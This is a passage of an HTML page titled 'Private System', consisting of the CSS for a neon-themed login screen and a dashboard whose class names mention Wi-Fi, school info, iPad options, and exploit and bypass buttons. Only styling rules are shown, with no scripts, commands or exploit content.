<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.css">
  <style>
    /* Neon Glow Effect - Applied to general interactive elements and boxes */
    :root {
      --neon-glow-color-light: #fef08a; /* Soft yellow for highlights */
      --neon-glow-color-medium: #ffe024; /* Brighter yellow */
      --neon-glow-color-strong: #ffc400; /* Strongest yellow for outer glow */
      --glow-blur-radius: 10px;
      --input-glow-focus: 0 0 5px var(--neon-glow-color-light), 0 0 10px var(--neon-glow-color-medium), 0 0 15px var(--neon-glow-color-strong);
      --box-glow: 0 0 8px var(--neon-glow-color-light), 0 0 15px var(--neon-glow-color-medium);
      --dashboard-glow: 0 0 10px var(--neon-glow-color-medium), 0 0 20px var(--neon-glow-color-strong);

      /* Theme colors - Default Dark */
      --body-bg-dark: #0a0a0a;
      --body-color-dark: #f0f0f0;
      --login-box-bg-dark: #1a1a1a;
      --input-bg-dark: #2a2a2a;
      --button-bg-dark: #4a4a4a;
      --button-color-dark: #f0f0f0;
      --accent-color-dark: #ffe024; /* Neon Yellow for primary accent */
      --error-color-dark: #ff4c4c;

      /* Light Theme */
      --body-bg-light: #e0e0e0;
      --body-color-light: #1a1a1a;
      --login-box-bg-light: #ffffff;
      --input-bg-light: #f0f0f0;
      --button-bg-light: #d0d0d0;
      --button-color-light: #1a1a1a;
      --accent-color-light: #007bff; /* A standard blue for light theme */
      --error-color-light: #cc0000;

      /* Quick Bar button default styling */
      --quickbar-button-bg: #444;
      --quickbar-button-color: #eee;
      --quickbar-button-hover-bg: #555;
      --quickbar-button-active-bg: #333;
    }

    body {
      margin: 0; padding: 0;
      background: var(--body-bg-dark);
      color: var(--body-color-dark);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: 'Roboto Mono', monospace; /* Modern techy font */
      overflow: hidden; /* Hide scrollbars during loading animation */
    }

    /* THEME MANAGEMENT */
    body.light-theme {
      background: var(--body-bg-light);
      color: var(--body-color-light);
    }
    .light-theme .login-box {
        background: var(--login-box-bg-light);
        border-color: var(--accent-color-light) !important;
        box-shadow: 0 0 10px rgba(0, 123, 255, 0.5) !important;
    }
    .light-theme .login-box input {
        background: var(--input-bg-light);
        color: var(--body-color-light);
    }
    .light-theme .login-box button {
        background-color: var(--accent-color-light) !important;
        color: var(--button-color-light) !important;
    }
    .light-theme .login-box button.show-password-toggle-on {
        background-color: #28a745 !important; /* Green */
    }
    .light-theme .quickbar-login button, .light-theme .login-time-date-box, .light-theme #showPasswordLabel span {
        background-color: var(--quickbar-button-bg) !important;
        color: var(--quickbar-button-color) !important;
        border: 1px solid var(--quickbar-button-bg);
    }
    .light-theme .quickbar-login button.panic-button { background-color: #dc3545 !important; }
    .light-theme #attemptsText, .light-theme #errorMsg { color: var(--error-color-light) !important; }

    /* LOADING SCREEN */
    #loadingScreen {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      width: 100vw;
      background: var(--body-bg-dark);
      position: absolute;
      top: 0; left: 0;
      z-index: 9999;
      transition: opacity 1s ease-out;
    }

    .cube-container {
      perspective: 1000px;
      margin-bottom: 20px;
    }

    .cube {
      width: 100px;
      height: 100px;
      position: relative;
      transform-style: preserve-3d;
      animation: rotateCube 4s infinite linear;
      box-shadow: var(--box-glow);
      border-radius: 5px;
    }

    .cube__face {
      position: absolute;
      width: 100px;
      height: 100px;
      background: rgba(var(--neon-glow-color-light), 0.3);
      border: 1px solid var(--neon-glow-color-medium);
      box-shadow: 0 0 10px var(--neon-glow-color-strong);
    }
    .cube__face--front  { transform: rotateY(0deg) translateZ(50px); }
    .cube__face--back   { transform: rotateX(180deg) translateZ(50px); }
    .cube__face--right  { transform: rotateY(90deg) translateZ(50px); }
    .cube__face--left   { transform: rotateY(-90deg) translateZ(50px); }
    .cube__face--top    { transform: rotateX(90deg) translateZ(50px); }
    .cube__face--bottom { transform: rotateX(-90deg) translateZ(50px); }

    @keyframes rotateCube {
      0% { transform: rotateX(0deg) rotateY(0deg); }
      100% { transform: rotateX(360deg) rotateY(360deg); }
    }

    .loading-text {
      font-size: 1.5em;
      font-weight: bold;
      text-transform: uppercase;
      letter-spacing: 2px;
      background-image: linear-gradient(to right, #ff8c00, #ff0000); /* Orange to Red */
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      animation: gradientText 3s infinite alternate linear, glowText 1.5s infinite alternate ease-in-out;
      margin-top: 15px;
    }

    @keyframes gradientText {
      0% { background-position: 0% 50%; }
      100% { background-position: 100% 50%; }
    }

    @keyframes glowText {
      0% { text-shadow: 0 0 5px rgba(255, 140, 0, 0.6); }
      50% { text-shadow: 0 0 10px rgba(255, 0, 0, 0.8), 0 0 20px rgba(255, 140, 0, 0.4); }
      100% { text-shadow: 0 0 5px rgba(255, 140, 0, 0.6); }
    }

    /* Login Page Load Animation */
    @keyframes loadLoginFromCube {
      0% { opacity: 0; transform: scale(0.5) translateY(-50px); }
      50% { opacity: 0; transform: scale(0.8) translateY(-20px); }
      100% { opacity: 1; transform: scale(1) translateY(0); }
    }
    .login-loaded {
      animation: loadLoginFromCube 1s ease-out forwards;
    }

    /* Dashboard Loading */
    #dashboardLoadingScreen {
      position: absolute;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background: var(--body-bg-dark);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 9998; /* Below initial loading, above login */
      transition: opacity 0.5s ease-out;
      opacity: 0; /* Hidden by default */
      pointer-events: none; /* No interaction when hidden */
    }

    .loading-code-box {
      background-color: #1a1a1a;
      border: 1px solid var(--neon-glow-color-medium);
      padding: 15px;
      margin-top: 20px;
      width: 300px;
      border-radius: 8px;
      font-family: 'Roboto Mono', monospace;
      font-size: 0.9em;
      color: #00ff00; /* Green code style */
      text-align: left;
      overflow: hidden;
      white-space: nowrap;
      position: relative;
      box-shadow: var(--box-glow);
    }
    .loading-code-text {
      display: inline-block;
      white-space: pre; /* Maintain whitespace for code display */
      animation: typingEffect 3s steps(40, end) forwards infinite alternate; /* Type effect */
    }

    @keyframes typingEffect {
      from { width: 0 }
      to { width: 100% }
    }


    /* Login System Styles */
    .login-page-container {
      position: relative;
      display: flex;
      flex-direction: column;
      align-items: center;
      max-width: 450px; /* Slightly wider to accommodate quick bar */
      width: 90%;
      padding: 0px 20px; /* Adjust padding if needed for quickbar */
    }

    .login-quick-bar {
      display: flex;
      justify-content: space-around;
      width: 100%;
      background: var(--input-bg-dark);
      border: 1px solid var(--accent-color-dark);
      box-shadow: var(--box-glow);
      padding: 8px 0;
      border-radius: 10px;
      margin-bottom: 20px;
    }
    .login-quick-bar button {
      background: var(--quickbar-button-bg);
      color: var(--quickbar-button-color);
      border: none;
      padding: 6px 12px;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      transition: all 0.2s ease-in-out;
      box-shadow: 0 0 3px rgba(0,0,0,0.3);
    }
    .login-quick-bar button:hover {
      background: var(--quickbar-button-hover-bg);
      box-shadow: var(--input-glow-focus);
    }
    .login-quick-bar button.panic-button {
      background: #dc3545; /* Red for panic */
      color: white;
    }
    .login-quick-bar button.panic-button:hover {
        background: #c82333;
        box-shadow: 0 0 8px #dc3545;
    }

    .login-box {
      background: var(--login-box-bg-dark);
      border-radius: 15px; /* Rounded corners */
      border: 3px solid var(--neon-glow-color-light); /* Neon border */
      box-shadow: var(--dashboard-glow); /* Neon glow */
      width: 380px; /* Increased width */
      padding: 30px 25px;
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s;
      margin-bottom: 20px; /* Space for time/date box */
    }

    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }

    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
      50% { border-color: var(--neon-glow-color-light); box-shadow: var(--dashboard-glow); }
    }

    .login-box h2 {
      font-size: 2em; /* Larger title */
      margin-bottom: 25px;
      font-family: 'Orbitron', sans-serif; /* Modern techy font */
      color: var(--accent-color-dark);
      text-shadow: 0 0 8px var(--neon-glow-color-strong);
    }

    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background: var(--input-bg-dark);
      border: 1px solid #444;
      color: var(--body-color-dark);
      border-radius: 8px;
      font-size: 1em;
      transition: border-color 0.3s, box-shadow 0.3s;
    }
    .login-box input:focus {
        outline: none;
        border-color: var(--neon-glow-color-medium);
        box-shadow: var(--input-glow-focus);
    }

    #showPasswordLabel {
      display: flex;
      align-items: center;
      font-size: 0.9em;
      margin-bottom: 15px;
      gap: 10px;
      cursor: pointer;
      position: relative; /* For the toggle styling */
    }

    /* Custom toggle switch for show password */
    #showPassword {
        display: none; /* Hide default checkbox */
    }
    #showPasswordLabel span {
        position: relative;
        padding-left: 45px; /* Space for the toggle switch */
        user-select: none;
        background-color: transparent; /* No background on text */
    }
    #showPasswordLabel span::before {
        content: '';
        position: absolute;
        left: 0;
        top: 50%;
        transform: translateY(-50%);
        width: 40px;
        height: 20px;
        background-color: #ccc;
        border-radius: 10px;
        transition: background-color 0.3s ease;
    }
    #showPasswordLabel span::after {
        content: '';
        position: absolute;
        left: 2px;
        top: 50%;
        transform: translateY(-50%);
        width: 16px;
        height: 16px;
        background-color: #fff;
        border-radius: 50%;
        transition: transform 0.3s ease;
    }
    #showPassword:checked + span::before {
        background-color: #28a745; /* Green when on */
    }
    #showPassword:checked + span::after {
        transform: translate(20px, -50%);
    }

    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: var(--button-bg-dark); /* Red */
      color: var(--button-color-dark);
      font-size: 1.1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s, box-shadow 0.3s;
      box-shadow: var(--box-glow);
    }
    .login-box button:hover {
        background-color: var(--accent-color-dark);
        color: black;
        box-shadow: 0 0 5px var(--accent-color-dark), 0 0 10px var(--neon-glow-color-strong);
    }

    .attempt-counter, .error-message {
      margin-top: 15px;
      font-size: 0.9em;
      color: var(--error-color-dark);
      text-shadow: 0 0 5px rgba(255, 0, 0, 0.5);
    }

    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 350px; /* Adjusted width */
      padding: 25px; /* Adjusted padding */
      transform: translate(-50%, -50%);
      background: var(--login-box-bg-dark);
      border: 3px solid var(--error-color-dark);
      border-radius: 15px; /* Rounded corners */
      box-shadow: 0 0 20px var(--error-color-dark);
      z-index: 100;
      color: var(--body-color-dark);
    }

    .popup input {
      margin-bottom: 20px;
    }

    .login-time-date-box {
        width: 100%;
        background-color: var(--input-bg-dark);
        border: 1px solid var(--accent-color-dark);
        box-shadow: var(--box-glow);
        padding: 10px 15px;
        border-radius: 8px;
        text-align: center;
        font-size: 1.1em;
        margin-top: 15px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        gap: 10px;
    }
    .time-date-display {
        flex-grow: 1;
        font-family: 'Orbitron', sans-serif;
    }
    .time-date-toggle-container {
        display: flex;
        align-items: center;
        gap: 8px;
    }
    .time-date-toggle-container label {
        font-size: 0.85em;
        margin: 0;
        color: var(--body-color-dark);
        cursor: pointer;
    }
    .time-date-toggle-container .switch {
      position: relative;
      display: inline-block;
      width: 34px;
      height: 20px;
    }

    .time-date-toggle-container .switch input {
      opacity: 0;
      width: 0;
      height: 0;
    }

    .time-date-toggle-container .slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: #ccc;
      transition: .4s;
      border-radius: 20px;
    }

    .time-date-toggle-container .slider:before {
      position: absolute;
      content: "";
      height: 14px;
      width: 14px;
      left: 3px;
      bottom: 3px;
      background-color: white;
      transition: .4s;
      border-radius: 50%;
    }

    .time-date-toggle-container input:checked + .slider {
      background-color: var(--accent-color-dark);
    }

    .time-date-toggle-container input:focus + .slider {
      box-shadow: 0 0 1px var(--accent-color-dark);
    }

    .time-date-toggle-container input:checked + .slider:before {
      transform: translateX(14px);
    }

    /* Dashboard Styles */
    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: #1a1a1a;
      color: #f9f2dc;
      padding: 20px;
      transition: background-color 0.3s, color 0.3s;
      zoom: 1;
      overflow: auto; /* Enable scroll if content overflows */
    }

    body.dashboard-body.light-theme {
      background-color: #f9f2dc;
      color: #1a1a1a;
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: #ff914d;
      padding: 15px 25px;
      border-radius: 12px;
      color: #000;
      margin-bottom: 20px;
      box-shadow: var(--box-glow);
    }
    .light-theme .dashboard-header {
      background: var(--accent-color-light);
      box-shadow: 0 0 10px rgba(0, 123, 255, 0.5);
      color: white;
    }


    .dashboard-header h1 {
      font-size: 28px;
      font-family: 'Orbitron', sans-serif;
      color: black;
    }
    .light-theme .dashboard-header h1 {
        color: white;
    }

    .user-info {
      font-weight: bold;
      color: #333;
    }
    .light-theme .user-info {
        color: #f0f0f0;
    }

    .version-box {
      background: var(--neon-glow-color-medium);
      padding: 8px 15px;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
      box-shadow: 0 0 5px var(--neon-glow-color-light);
    }
    .light-theme .version-box {
        background: var(--body-bg-light);
        box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
    }

    .quick-bar {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 20px;
      flex-wrap: wrap;
      background: #2a2a2a;
      padding: 15px;
      border-radius: 12px;
      box-shadow: var(--dashboard-glow);
    }
    .light-theme .quick-bar {
        background: var(--input-bg-light);
        box-shadow: 0 0 10px rgba(0, 123, 255, 0.5);
    }

    .quick-bar button, .quick-bar .search-container input, .quick-bar .search-container button {
      background-color: var(--accent-color-dark);
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, box-shadow 0.2s;
      min-width: 110px;
      white-space: nowrap;
      box-shadow: 0 0 5px rgba(0,0,0,0.3);
    }

    .quick-bar button:hover, .quick-bar .search-container input:focus, .quick-bar .search-container button:hover {
      background-color: #ffb67a;
      box-shadow: var(--input-glow-focus);
    }
    .light-theme .quick-bar button, .light-theme .quick-bar .search-container input, .light-theme .quick-bar .search-container button {
        background-color: var(--accent-color-light);
        color: white;
    }
    .light-theme .quick-bar button:hover, .light-theme .quick-bar .search-container input:focus, .light-theme .quick-bar .search-container button:hover {
        background-color: #0056b3;
    }


    #panicBtn {
      background: #ff4c4c !important;
      color: white !important;
      box-shadow: 0 0 8px #ff4c4c;
    }
    #panicBtn:hover {
        background: #e60000 !important;
        box-shadow: 0 0 12px #ff4c4c;
    }

    .search-container {
      display: flex;
      gap: 5px;
      flex-grow: 1;
      max-width: 300px;
    }
    .search-container input {
      flex-grow: 1;
      min-width: unset; /* Override min-width from button styles */
      background: #333;
      border: 1px solid var(--accent-color-dark);
      color: var(--body-color-dark);
      padding-left: 10px;
      box-shadow: var(--box-glow);
    }
    .search-container input:focus {
        outline: none;
        border-color: var(--neon-glow-color-medium);
        box-shadow: var(--input-glow-focus);
    }
    .light-theme .search-container input {
        background: var(--input-bg-light);
        border-color: var(--accent-color-light);
        color: var(--body-color-light);
    }


    .announcement-bar {
      width: 100%;
      background-color: var(--accent-color-dark);
      color: black;
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
      box-shadow: var(--box-glow);
    }
    .light-theme .announcement-bar {
        background-color: var(--accent-color-light);
        color: white;
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    .main-row, .info-panel-container { /* Renamed updatesNotifications to info-panel-container for more panels */
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }

    .box {
      background-color: #2a2a2a;
      padding: 20px;
      border-radius: 12px;
      box-shadow: var(--box-glow); /* Changed to consistent neon glow */
      min-height: 120px;
      transition: background-color 0.3s, color 0.3s, box-shadow 0.3s;
      flex: 1 1 300px;
      position: relative; /* For draggable handle */
    }
    /* Draggable handle for panels */
    .box-handle {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 20px; /* Small area at the top for dragging */
        cursor: grab;
        border-top-left-radius: 10px;
        border-top-right-radius: 10px;
        background-color: rgba(var(--neon-glow-color-light), 0.1);
        border-bottom: 1px solid var(--neon-glow-color-light);
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 0.8em;
        color: rgba(255, 255, 255, 0.5);
    }
    .box-handle:hover {
        background-color: rgba(var(--neon-glow-color-light), 0.2);
    }


    body.dashboard-body.light-theme .box {
      background-color: var(--input-bg-light);
      color: var(--body-color-light);
      box-shadow: 0 0 10px rgba(0, 123, 255, 0.5);
    }

    .box h2 {
      font-size: 20px;
      margin-top: 10px; /* Adjusted due to handle */
      margin-bottom: 10px;
      color: var(--neon-glow-color-medium);
      text-shadow: 0 0 5px var(--neon-glow-color-light);
    }

    body.dashboard-body.light-theme .box h2 {
      color: var(--accent-color-light);
      text-shadow: none;
    }

    .box p, .box ul {
      font-size: 14px;
    }

    .update-entry {
      background: #3a3a3a;
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: #ccc;
      box-shadow: 0 0 3px rgba(0,0,0,0.3);
    }

    body.dashboard-body.light-theme .update-entry {
      background: #e0e0e0;
      color: #1a1a1a;
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    .calendar div {
      padding: 6px;
      background: #333;
      border-radius: 4px;
      box-shadow: 0 0 3px rgba(0,0,0,0.3);
    }

    .today {
      background: var(--accent-color-dark) !important;
      font-weight: bold;
      color: black;
      box-shadow: 0 0 5px var(--neon-glow-color-light) !important;
    }

    body.dashboard-body.light-theme .calendar div {
      background: #ddd;
      color: #000;
    }

    body.dashboard-body.light-theme .today {
      background: var(--accent-color-light) !important;
      color: white;
      box-shadow: 0 0 5px rgba(0, 123, 255, 0.5) !important;
    }

    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
      padding: 20px;
      background-color: #2a2a2a;
      border-radius: 12px;
      box-shadow: var(--dashboard-glow);
    }
    .light-theme #canvasContainer {
        background-color: var(--input-bg-light);
        box-shadow: 0 0 10px rgba(0, 123, 255, 0.5);
    }

    #notesCanvas {
      border: 2px solid var(--neon-glow-color-medium);
      border-radius: 12px;
      background: #fff; /* Always white for drawing surface */
      cursor: crosshair;
      touch-action: none;
      box-shadow: var(--box-glow);
    }

    #canvasControls {
      margin-top: 15px;
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      justify-content: center;
    }

    #canvasControls button, #canvasControls input[type="color"], #canvasControls select {
      background-color: var(--accent-color-dark);
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, box-shadow 0.2s;
      box-shadow: 0 0 3px rgba(0,0,0,0.3);
      min-width: unset; /* Override quickbar min-width */
    }
    #canvasControls button:hover, #canvasControls input[type="color"]:hover, #canvasControls select:hover {
      background-color: #ffb67a;
      box-shadow: var(--input-glow-focus);
    }
    .light-theme #canvasControls button, .light-theme #canvasControls input[type="color"], .light-theme #canvasControls select {
        background-color: var(--accent-color-light);
        color: white;
    }
    .light-theme #canvasControls button:hover, .light-theme #canvasControls input[type="color"]:hover, .light-theme #canvasControls select:hover {
        background-color: #0056b3;
    }


    #thicknessSlider {
      -webkit-appearance: none;
      width: 100px;
      height: 8px;
      background: #d3d3d3;
      outline: none;
      opacity: 0.7;
      transition: opacity .2s;
      border-radius: 5px;
    }
    #thicknessSlider::-webkit-slider-thumb {
      -webkit-appearance: none;
      appearance: none;
      width: 18px;
      height: 18px;
      border-radius: 50%;
      background: var(--accent-color-dark);
      cursor: grab;
      box-shadow: 0 0 5px black;
    }
    #thicknessSlider::-webkit-slider-thumb:hover {
      box-shadow: var(--input-glow-focus);
    }
    #thicknessSlider::-moz-range-thumb {
      width: 18px;
      height: 18px;
      border-radius: 50%;
      background: var(--accent-color-dark);
      cursor: grab;
      box-shadow: 0 0 5px black;
    }

    #textNoteInput {
        background: var(--input-bg-dark);
        color: var(--body-color-dark);
        border: 1px solid #444;
        padding: 6px 10px;
        border-radius: 6px;
        min-width: 150px;
    }
    #textNoteInput:focus {
        outline: none;
        border-color: var(--neon-glow-color-medium);
        box-shadow: var(--input-glow-focus);
    }
    .light-theme #textNoteInput {
        background: var(--input-bg-light);
        color: var(--body-color-light);
        border-color: #ccc;
    }

    .motivation-box, .facts-box, .quotes-box {
      background-color: #333;
      color: var(--neon-glow-color-light);
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: var(--box-glow);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
      position: relative; /* For draggable handle */
    }

    body.dashboard-body.light-theme .motivation-box,
    body.dashboard-body.light-theme .facts-box,
    body.dashboard-body.light-theme .quotes-box {
      background-color: var(--input-bg-light);
      color: var(--body-color-light);
      box-shadow: 0 0 10px rgba(0, 123, 255, 0.5);
    }
    body.dashboard-body.light-theme .motivation-box h2,
    body.dashboard-body.light-theme .facts-box h2,
    body.dashboard-body.light-theme .quotes-box h2 {
      color: var(--accent-color-light);
      text-shadow: none;
    }

    /* Notification Alert in Dashboard */
    .dashboard-alert {
      position: fixed;
      top: 20px;
      right: 20px;
      background-color: var(--neon-glow-color-medium);
      color: black;
      padding: 12px 20px;
      border-radius: 8px;
      box-shadow: 0 0 15px var(--neon-glow-color-strong);
      font-weight: bold;
      opacity: 0;
      transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out;
      transform: translateX(100%);
      z-index: 1000;
      min-width: 200px;
    }
    .dashboard-alert.show {
      opacity: 1;
      transform: translateX(0);
    }
    .dashboard-alert.error {
        background-color: #dc3545;
        color: white;
        box-shadow: 0 0 15px #dc3545;
    }
    .dashboard-alert.success {
        background-color: #28a745;
        color: white;
        box-shadow: 0 0 15px #28a745;
    }
    .light-theme .dashboard-alert {
        background-color: var(--accent-color-light);
        color: white;
        box-shadow: 0 0 10px rgba(0, 123, 255, 0.5);
    }


    /* Info Panel Styles */
    .info-panel {
      display: none;
      background-color: #2a2a2a;
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: var(--dashboard-glow);
      position: relative; /* For draggable handle */
    }
    .light-theme .info-panel {
      background-color: var(--input-bg-light);
      color: var(--body-color-light);
      box-shadow: 0 0 10px rgba(0, 123, 255, 0.5);
    }

    .info-panel h2 {
      color: var(--neon-glow-color-medium);
      margin-top: 10px; /* Adjusted due to handle */
      margin-bottom: 15px;
      text-shadow: 0 0 5px var(--neon-glow-color-light);
    }
    .light-theme .info-panel h2 {
      color: var(--accent-color-light);
      text-shadow: none;
    }

    .wifi-grid {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 15px;
    }

    .wifi-grid div {
      padding: 8px;
      background: #333;
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
      box-shadow: 0 0 3px rgba(0,0,0,0.3);
    }
    .light-theme .wifi-grid div {
        background: #e0e0e0;
        color: var(--body-color-light);
    }


    .wifi-entry {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 10px;
    }

    .wifi-entry div {
      padding: 8px;
      background: #444;
      border-radius: 6px;
      text-align: center;
      box-shadow: 0 0 3px rgba(0,0,0,0.3);
    }
    .light-theme .wifi-entry div {
        background: #f0f0f0;
        color: var(--body-color-light);
    }


    /* Wifi Signal Level Colors */
    .wifi-level-high { background-color: #28a745 !important; color: white !important; } /* Green */
    .wifi-level-medium { background-color: #ffc107 !important; color: black !important; } /* Yellow */
    .wifi-level-low { background-color: #dc3545 !important; color: white !important; } /* Red */
    .wifi-level-other { background-color: #6c757d !important; color: white !important; } /* Grey */

    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); /* Responsive grid */
      gap: 10px;
      margin-top: 15px;
    }

    .handbook-buttons button, .links-list a, .exploit-buttons a, .bypass-buttons button {
      background-color: var(--accent-color-dark);
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, box-shadow 0.2s;
      text-decoration: none;
      text-align: center;
      box-shadow: 0 0 3px rgba(0,0,0,0.3);
    }
    .handbook-buttons button:hover, .links-list a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover {
        background-color: #ffb67a;
        box-shadow: var(--input-glow-focus);
    }
    .light-theme .handbook-buttons button, .light-theme .links-list a, .light-theme .exploit-buttons a, .light-theme .bypass-buttons button {
        background-color: var(--accent-color-light);
        color: white;
    }
    .light-theme .handbook-buttons button:hover, .light-theme .links-list a:hover, .light-theme .exploit-buttons a:hover, .light-theme .bypass-buttons button:hover {
        background-color: #0056b3;
    }


    .coming-soon, .info-text {
      background: #444;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
      color: #ddd;
      box-shadow: 0 0 5px rgba(0,0,0,0.3);
    }
    .light-theme .coming-soon, .light-theme .info-text {
        background: #e0e0e0;
        color: #1a1a1a;
    }

    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .school-info-item {
      background: #444;
      padding: 12px;
      border-radius: 8px;
      box-shadow: 0 0 3px rgba(0,0,0,0.3);
    }
    .light-theme .school-info-item {
        background: #e0e0e0;
    }

    .school-info-label {
      font-weight: bold;
      color: var(--neon-glow-color-medium);
      margin-bottom: 5px;
    }
    .light-theme .school-info-label {
        color: var(--accent-color-light);
    }

    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    .ipad-options button {
      flex: 1;
      background-color: var(--accent-color-dark);
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, box-shadow 0.2s;
    }

    .ipad-options button:hover {
      background-color: #ffb67a;
      box-shadow: var(--input-glow-focus);
    }
    .light-theme .ipad-options button {
        background-color: var(--accent-color-light);
        color: white;
    }
    .light-theme .ipad-options button:hover {
        background-color: #0056b3;
    }

    .ipad-content, .bypass-content, .calculator-content, .converter-content, .timer-content,
    .activity-logs-content, .login-history-content, .stats-content, .settings-content,
    .reminder-content, .media-content, .keybinds-content {
      display: none;
      background: #444;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      box-shadow: 0 0 5px rgba(0,0,0,0.3);
      color: #eee;
    }
    .light-theme .ipad-content, .light-theme .bypass-content, .light-theme .calculator-content, .light-theme .converter-content, .light-theme .timer-content,
    .light-theme .activity-logs-content, .light-theme .login-history-content, .light-theme .stats-content, .light-theme .settings-content,
    .light-theme .reminder-content, .light-theme .media-content, .light-theme .keybinds-content {
        background: #e0e0e0;
        color: #1a1a1a;
    }

    /* Calculator styles */
    .calculator-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 5px;
      max-width: 300px;
      margin: 10px auto;
    }
    #calc-display {
      grid-column: span 4;
      background-color: #333;
      color: #0f0;
      border: 1px solid #0a0;
      padding: 10px;
      font-size: 1.5em;
      text-align: right;
      border-radius: 5px;
      margin-bottom: 5px;
    }
    .calculator-grid button {
      padding: 10px;
      font-size: 1.1em;
      border: none;
      border-radius: 5px;
      background-color: var(--accent-color-dark);
      color: black;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    .calculator-grid button.operator {
      background-color: #ff8c00;
      color: white;
    }
    .calculator-grid button.equals {
      background-color: #28a745;
      color: white;
    }
    .calculator-grid button.clear {
      background-color: #dc3545;
      color: white;
    }
    .calculator-grid button:hover {
      opacity: 0.9;
    }
    .light-theme .calculator-grid button {
        background-color: var(--accent-color-light);
        color: white;
    }
    .light-theme .calculator-grid button.operator { background-color: #0056b3; }
    .light-theme .calculator-grid button.equals { background-color: #218838; }
    .light-theme .calculator-grid button.clear { background-color: #c82333; }
    .light-theme #calc-display { background-color: #f0f0f0; color: #333; }

    /* Unit Converter styles */
    .converter-row {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      margin-bottom: 10px;
      align-items: center;
      justify-content: center;
    }
    .converter-row label { flex-basis: 100%; text-align: center; }
    .converter-row select, .converter-row input {
        padding: 8px;
        border-radius: 5px;
        border: 1px solid #666;
        background-color: #333;
        color: #eee;
        min-width: 120px;
    }
    .converter-row input:focus, .converter-row select:focus { outline: none; box-shadow: var(--input-glow-focus); }
    .converter-result {
        font-weight: bold;
        margin-top: 10px;
        padding: 10px;
        background-color: #333;
        border-radius: 5px;
        color: #0f0;
        text-align: center;
    }
    .light-theme .converter-row select, .light-theme .converter-row input {
        background-color: #f0f0f0;
        border-color: #ccc;
        color: #1a1a1a;
    }
    .light-theme .converter-result {
        background-color: #f0f0f0;
        color: #1a1a1a;
    }

    /* Timer/Stopwatch */
    .timer-display {
        font-size: 2.5em;
        text-align: center;
        margin-bottom: 15px;
